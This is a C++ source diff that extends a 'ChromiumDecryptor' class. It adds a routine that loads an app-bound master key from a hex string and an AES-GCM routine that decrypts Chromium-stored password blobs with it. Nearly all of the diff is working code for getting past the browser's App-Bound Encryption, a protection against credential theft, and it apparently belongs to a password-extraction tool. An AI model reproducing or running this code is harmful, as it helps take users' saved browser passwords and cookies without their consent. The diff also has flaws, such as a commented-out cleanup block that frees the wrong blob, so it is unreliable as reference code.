@@ -1,6 +1,7 @@
 #include "includes\ChromiumDecryptor.h"
 
 DATA_BLOB* master_key_blob;
+DATA_BLOB* app_bound_master_key_blob = nullptr;
 
 ChromiumDecryptor::ChromiumDecryptor() {}
 ChromiumDecryptor::~ChromiumDecryptor() {
@@ -9,6 +10,47 @@ ChromiumDecryptor::~ChromiumDecryptor() {
 		LocalFree(master_key_blob->pbData);
 		delete master_key_blob;
 	}
+
+	/*if (app_bound_master_key_blob != nullptr) {
+		LocalFree(master_key_blob->pbData);
+		delete master_key_blob;
+	}*/
+}
+
+bool ChromiumDecryptor::ChromiumAppBoundDecryptorInit(std::string hexString)
+{
+	// Remove the last two characters if they are a space and newline
+	if (hexString.size() >= 2 && hexString[hexString.size() - 2] == ' ' && hexString[hexString.size() - 1] == '\n') {
+		hexString.erase(hexString.size() - 2, 2);
+	}
+
+	// Check if the hex string has an even number of characters
+	if (hexString.length() % 2 != 0) {
+		//std::cerr << "Hex string must have an even number of characters." << std::endl;
+		return false;
+	}
+
+	// Calculate the number of bytes
+	size_t numBytes = hexString.length() / 2;
+
+	// Allocate memory for the DATA_BLOB
+	app_bound_master_key_blob = new DATA_BLOB;
+	app_bound_master_key_blob->cbData = static_cast<DWORD>(numBytes);
+	app_bound_master_key_blob->pbData = static_cast<BYTE*>(malloc(numBytes));
+
+	if (!app_bound_master_key_blob->pbData) {
+		//std::cerr << "Memory allocation failed." << std::endl;
+		delete app_bound_master_key_blob;
+		app_bound_master_key_blob = nullptr;
+		return false;
+	}
+
+	// Convert hex string to bytes
+	for (size_t i = 0; i < numBytes; ++i) {
+		std::string byteString = hexString.substr(i * 2, 2);
+		app_bound_master_key_blob->pbData[i] = static_cast<BYTE>(std::stoul(byteString, nullptr, 16));
+	}
+	return true;
 }
 
 bool ChromiumDecryptor::ChromiumDecryptorInit(std::string path)
@@ -46,7 +88,6 @@ DATA_BLOB* ChromiumDecryptor::UnportectMasterKey(std::string MasterString)
 {
 	std::vector<unsigned char> binaryKey;
 	DWORD binaryKeySize = 0;
-
 
 	// Decoding the base64 encoded string to binary data.
 	if (!CryptStringToBinaryA(MasterString.c_str(), 0, CRYPT_STRING_BASE64, NULL, &binaryKeySize, NULL, NULL))
@@ -165,6 +206,90 @@ std::string ChromiumDecryptor::AESDecrypter(std::vector<BYTE> EncryptedBlob)
 		return "";
 	}
 }
+
+std::string ChromiumDecryptor::AESDecrypterAppBound(std::vector<BYTE> EncryptedBlob)
+{
+	try
+	{
+		BCRYPT_ALG_HANDLE hAlgorithm = 0;
+		BCRYPT_KEY_HANDLE hKey = 0;
+		NTSTATUS status = 0;
+		SIZE_T EncryptedBlobSize = EncryptedBlob.size();
+		SIZE_T TagOffset = EncryptedBlobSize - 15;
+		ULONG PlainTextSize = 0;
+
+		std::vector<BYTE> CipherPass(EncryptedBlobSize); // hold the passwords ciphertext.
+		std::vector<BYTE> PlainText;
+		std::vector<BYTE> IV(IV_SIZE); // Will hold initial vector data.
+
+		// Parse iv and password from the buffer using std::copy
+		std::copy(EncryptedBlob.data() + 3, EncryptedBlob.data() + 3 + IV_SIZE, IV.begin());
+		std::copy(EncryptedBlob.data() + 15, EncryptedBlob.data() + EncryptedBlobSize, CipherPass.begin());
+
+		// Open algorithm provider for decryption
+		status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
+		if (!BCRYPT_SUCCESS(status))
+		{
+			std::cout << "BCryptOpenAlgorithmProvider failed with status: " << status << std::endl;
+			return "";
+		}
+
+		// Set chaining mode for decryption
+		status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (UCHAR*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
+		if (!BCRYPT_SUCCESS(status))
+		{
+			std::cout << "BCryptSetProperty failed with status: " << status << std::endl;
+			BCryptCloseAlgorithmProvider(hAlgorithm, 0);
+			return "";
+		}
+
+		// Generate symmetric key
+		status = BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, app_bound_master_key_blob->pbData, app_bound_master_key_blob->cbData, 0);
+		if (!BCRYPT_SUCCESS(status))
+		{
+			std::cout << "BcryptGenertaeSymmetricKey failed with status: " << status << std::endl;
+			BCryptCloseAlgorithmProvider(hAlgorithm, 0);
+			return "";
+		}
+
+		// Auth cipher mode info
+		BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO AuthInfo;
+		BCRYPT_INIT_AUTH_MODE_INFO(AuthInfo);
+		TagOffset = TagOffset - 16;
+		AuthInfo.pbNonce = IV.data();
+		AuthInfo.cbNonce = IV_SIZE;
+		AuthInfo.pbTag = CipherPass.data() + TagOffset;
+		AuthInfo.cbTag = TAG_SIZE;
+
+		// Get size of plaintext buffer
+		status = BCryptDecrypt(hKey, CipherPass.data(), TagOffset, &AuthInfo, NULL, 0, NULL, NULL, &PlainTextSize, 0);
+		if (!BCRYPT_SUCCESS(status))
+		{
+			std::cout << "BCryptDecrypt (1) failed with status: " << status << std::endl;
+			return "";
+		}
+
+		// Allocate memory for the plaintext
+		PlainText.resize(PlainTextSize);
+
+		status = BCryptDecrypt(hKey, CipherPass.data(), TagOffset, &AuthInfo, NULL, 0, PlainText.data(), PlainTextSize, &PlainTextSize, 0);
+		if (!BCRYPT_SUCCESS(status))
+		{
+			std::cout << "BCrypt Decrypt (2) failed with status: " << status << std::endl;
+			return "";
+		}
+
+		// Close the algorithm handle
+		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
+
+		return std::string(PlainText.begin(), PlainText.end());
+	}
+	catch (int e)
+	{
+		return "";
+	}
+}
+
 
 std::string ChromiumDecryptor::read_json(const std::string& filePath) {
 	std::ifstream file(filePath);
